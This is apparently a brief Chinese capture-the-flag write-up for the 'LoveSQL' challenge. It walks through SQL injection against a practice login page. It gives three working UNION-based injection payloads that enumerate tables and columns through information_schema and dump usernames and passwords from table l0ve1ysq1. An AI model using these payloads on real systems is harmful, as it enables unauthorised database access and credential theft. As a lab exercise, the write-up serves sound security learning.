# [极客大挑战 2019]LoveSQL

## Tag

SQL 注入

***

## Writeup

万能密码得到：

![image-20260120144647696](../../../../assets/image-20260120144647696.png)

尝试 UNION 注入，可以直接得知 database 名为 geek：

![image-20260120144726805](../../../../assets/image-20260120144726805.png)

布尔盲注可以得到表名为 l0ve1ysq1（太笨了）

Payload：`1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#` 查看所有表：

![image-20260120152747168](../../../../assets/image-20260120152747168.png)

Payload：`1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#`查看所有字段：

![image-20260120153105702](../../../../assets/image-20260120153105702.png)

Payload：`1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1#` 查看所有字段值：

![image-20260120153346427](../../../../assets/image-20260120153346427.png)
